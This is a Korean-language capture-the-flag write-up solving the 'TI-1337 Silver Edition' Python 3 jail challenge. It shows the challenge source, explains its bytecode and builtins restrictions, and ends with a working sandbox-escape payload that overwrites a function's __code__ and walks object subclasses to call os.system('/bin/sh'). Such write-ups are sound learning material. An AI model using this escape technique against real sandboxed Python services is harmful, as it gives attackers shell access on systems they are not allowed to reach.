# TI-1337 Silver Edition

## #python #jail

---

python 3 버전의 jail 문제이다. 이전에 풀어본 python 2 버전하고는 좀 달라진 부분이 있다.

- `code` 객체 내의 `func_code` 가 `__code__` 로 명칭이 변경되었다.

- `func_globals` 가 `__globals__` 로 명칭이 변경되었다.

사실상 웬만한 builtin 모듈? 변수? 네이밍이 **double undersocre** 로 통일 되었다.

아래는 문제 소스이다.

```python
# ti1337se.py
#!/usr/bin/env python3
import dis
import sys

banned = ["MAKE_FUNCTION", "CALL_FUNCTION", "CALL_FUNCTION_KW", "CALL_FUNCTION_EX"]

used_gift = False

def gift(target, name, value):
	global used_gift
	if used_gift: sys.exit(1)
	used_gift = True
	setattr(target, name, value)

print("Welcome to the TI-1337 Silver Edition. Enter your calculations below:")

math = input("> ")
if len(math) > 1337:
	print("Nobody needs that much math!")
	sys.exit(1)
code = compile(math, "<math>", "exec")

bytecode = list(code.co_code)
instructions = list(dis.get_instructions(code))
for i, inst in enumerate(instructions):
	if inst.is_jump_target:
		print("Math doesn't need control flow!")
		sys.exit(1)
	nextoffset = instructions[i+1].offset if i+1 < len(instructions) else len(bytecode)
	if inst.opname in banned:
		bytecode[inst.offset:instructions[i+1].offset] = [-1]*(instructions[i+1].offset-inst.offset)

names = list(code.co_names)
for i, name in enumerate(code.co_names):
	if "__" in name: names[i] = "$INVALID$"

code = code.replace(co_code=bytes(b for b in bytecode if b >= 0), co_names=tuple(names), co_stacksize=2**20)
v = {}
exec(code, {"__builtins__": {"gift": gift}}, v)
if v: print("\n".join(f"{name} = {val}" for name, val in v.items()))
else: print("No results stored.")
```

## 제한 조건 1) 맨 처음 input 구문에는 `__` 가 들어가선 안된다.

엄밀히 말하면, `__` 가 인자로 쓰이는 것 외에는 pure code 로 쓰여서는 안된다는 말이다.

```python
code = compile(math, "<math>", "exec")
```

해당 구문에서 code 는 바이트 코드가 되어 나오는데, 이 객체의 `co_names` 변수는 바이트 코드 구문에서 쓰이는 모든 변수명(?) 들의 집합이 담긴 리스트이다.

따라서 `__` 를 써버리게 되면, 아래의 필터링에 걸리게 된다.

```python
names = list(code.co_names)
for i, name in enumerate(code.co_names):
	if "__" in name: names[i] = "$INVALID$"
```

그러나, 함수 인자에 string 형태로 `__` 를 포함시켜 전달하는 것은 가능하다!

## 제한조건2) 함수정의하여 사용 불가

`def` 와 `lambda` 또한 사용이 불가하다.

```python
code = compile(math, "<math>", "exec")
# ~~~(중간 생략)~~~
code = code.replace(co_code=bytes(b for b in bytecode if b >= 0), co_names=tuple(names), co_stacksize=2**20)
```

위 코드에 의하면, `compile` 된 바이트 코드는 일정 필터링을 거쳐서 정상적인 소스코드로 변경되어야 하지만 아래의 필터링 때문에 악의적인 바이트 코드 명령은 모두 -1 처리 된다.

```python
banned = ["MAKE_FUNCTION", "CALL_FUNCTION", "CALL_FUNCTION_KW", "CALL_FUNCTION_EX"]
# ~~~ (중간생략) ~~~
for i, inst in enumerate(instructions):
	if inst.is_jump_target:
		print("Math doesn't need control flow!")
		sys.exit(1)
	nextoffset = instructions[i+1].offset if i+1 < len(instructions) else len(bytecode)
	if inst.opname in banned:
		bytecode[inst.offset:instructions[i+1].offset] = [-1]*(instructions[i+1].offset-inst.offset)
```

그러므로 `<function>`, `<lambda>` 객체들은 기대할 수 없다.

오로지 `compile` 에서 나온 `<code>` object 만 있을 뿐이다.

## 제한 조건3) 제한된 `__builtins__`

```python
exec(code, {"__builtins__": {"gift": gift}}, v)
```

위 코드를 보면 `exec` 실행 시, `__builtins__` 를 gift 함수만 주고 실행시켜버린다.

한 마디로 `print` 부터 뭐 `hex()` 등등 못 쓴다는 이야기다.

---

다시 문제로 돌아와서 우리가 결론적으로 이용해야하는 것은 아래의 부분이다.

```python
def gift(target, name, value):
	global used_gift
	if used_gift: sys.exit(1)
	used_gift = True
	setattr(target, name, value) # This part!!!
```

`setattr` 함수는 jail 문제에서 주로 사용되는 함수로 객체 내부의 속성값을 변경할 수 있는 함수이다.

이 때, 문자열 형식외의 raw 한 `__` 은 사용할 수 없으므로 eval 함수 안에 문자열 형식으로 쉘을 켜는 코드를 넣어 lambda 함수로 만든 후, `Function` 타입이 아닌 `code` 형식으로 변수 c 가 반환 되면 해당 code 객체를 gift 함수코드에 덧입힌다.

그렇게 해서 gift 함수를 실행시키면 된다.

## payload

```python
c = (lambda: eval("().__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os.path'].os.system('/bin/sh')"),lambda: eval("().__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os.path'].os.system('/bin/sh')"))[0]; gift.f = gift; gift.f(gift, "__code__", c); gift.f();
```
